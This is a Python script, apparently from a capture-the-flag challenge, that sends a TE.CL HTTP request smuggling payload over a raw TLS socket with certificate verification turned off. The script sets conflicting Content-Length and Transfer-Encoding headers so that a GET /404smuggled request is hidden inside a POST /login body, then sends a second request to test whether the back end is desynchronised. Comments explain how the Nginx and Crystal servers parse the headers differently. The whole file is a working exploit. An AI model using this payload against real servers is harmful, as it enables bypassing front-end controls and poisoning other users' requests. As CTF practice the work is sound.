import socket
import ssl

hostname = "65b68ef3c79fb356.chal.ctf.ae"
port = 443

def send_raw(raw_data):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((hostname, port), timeout=10)
    ss = ctx.wrap_socket(s, server_hostname=hostname)
    ss.sendall(raw_data)
    response = b""
    ss.settimeout(3)
    try:
        while True:
            chunk = ss.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    ss.close()
    return response

# Test: Send CL and TE together
# If Nginx uses TE and Crystal uses CL: (TE.CL)
# Nginx sees chunked, terminates at 0\r\n\r\n.
# Crystal sees Content-Length: 4, reads only "5c\r\n", leaves the rest in socket!
smuggled = (
    "GET /404smuggled HTTP/1.1\r\n"
    f"Host: {hostname}\r\n"
    "\r\n"
)

# In TE.CL:
# Front-end (Nginx) uses TE:
# chunk size: len(smuggled) in hex
# chunk data: smuggled
# terminating chunk: 0\r\n\r\n
# Back-end (Crystal) uses Content-Length: 4 -> reads only first 4 bytes.
payload = (
    f"POST /login HTTP/1.1\r\n"
    f"Host: {hostname}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 4\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{hex(len(smuggled))[2:]}\r\n"
    f"{smuggled}\r\n"
    f"0\r\n\r\n"
    # Second request on the same connection:
    f"GET /healthz HTTP/1.1\r\n"
    f"Host: {hostname}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
).encode()

res = send_raw(payload)
print("Response:")
print(res.decode('utf-8', errors='ignore'))
